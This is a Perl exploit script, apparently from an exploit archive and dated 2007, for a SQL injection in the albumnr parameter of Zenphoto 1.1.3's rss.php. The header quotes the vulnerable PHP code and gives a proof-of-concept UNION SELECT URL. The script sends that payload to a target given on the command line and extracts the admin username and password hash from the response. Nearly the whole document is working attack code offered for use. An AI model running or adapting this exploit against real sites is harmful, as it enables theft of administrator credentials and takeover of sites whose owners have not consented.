<html><head><title>Zenphoto 1.1.3 (rss.php albumnr) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

#################################################################################
#                                                                               #
#                      Zenphoto 1.1.3 SQL Injection Exploit                     #
#                                                                               #
# Discovered by: Silentz                                                        #
# Payload: Admin Username &amp; Hash Retrieval                                      #
# Website: http://www.w4ck1ng.com                                               #
#                                                                               #
# Vulnerable Code (rss.php):                                                    #
#                                                                               #
#      $albumnr = $_GET[albumnr];						#
#      	 									#
#       if ($albumnr != &quot;&quot;)							#
#	{ $sql = &quot;SELECT * FROM &quot;. prefix(&quot;images&quot;) .&quot; WHERE albumid = $albumnr #
#          AND `show` = 1 ORDER BY id DESC LIMIT &quot;.$items;}			#
#        else									#
# 	{ $sql = &quot;SELECT * FROM &quot;. prefix(&quot;images&quot;) .&quot; WHERE `show` = 1 ORDER 	#
#          BY id DESC LIMIT &quot;.$items; }						#
#                                                                               #
# PoC: http://victim.com/zenphoto/rss.php?albumnr=1 UNION SELECT 0,0,0,(SELECT  #
# value FROM zp_options WHERE id=12),(SELECT value FROM zp_options WHERE id=13) # 
# ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, #
# 0,0,0,0/*	                                                                #
#                                                                               #
# Subject To: Nothing!			                                        #
# GoogleDork: Get your own!                                                     #
#                                                                               #
# Shoutz: The entire w4ck1ng community                                          #
#                                                                               #
# NOTE: The vulnerbility exists in versions 1.1, 1.1.1, 1.1.2 &amp; 1.1.3 BUT you'd #
#       have to alter the payload in order to make it work for any versions     #
#       other than 1.1.3. 							#
#										#
#################################################################################

use LWP::UserAgent;
die &quot;Example: exploit.pl http://victim.com/\n&quot; unless @ARGV;

$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $ARGV[0] . &quot;rss.php?albumnr=1 UNION SELECT 0,0,0,(SELECT value FROM zp_options WHERE id=12),(SELECT value FROM zp_options WHERE id=13),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0/*&quot;;

$res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
$answer = $res-&gt;content;

if ($answer =~ /&lt;webMaster&gt;(.*?)&lt;\/webMaster&gt;/){
        print &quot;\nBrought to you by w4ck1ng.com...\n&quot;;
        print &quot;\n[+] Admin User : $1&quot;;
}

if ($answer =~/([0-9a-fA-F]{32})/){print &quot;\n[+] Admin Hash : $1\n\n&quot;;}

else{print &quot;\n[-] Exploit Failed...\n&quot;;}

# milw0rm.com [2007-12-31]</pre></html>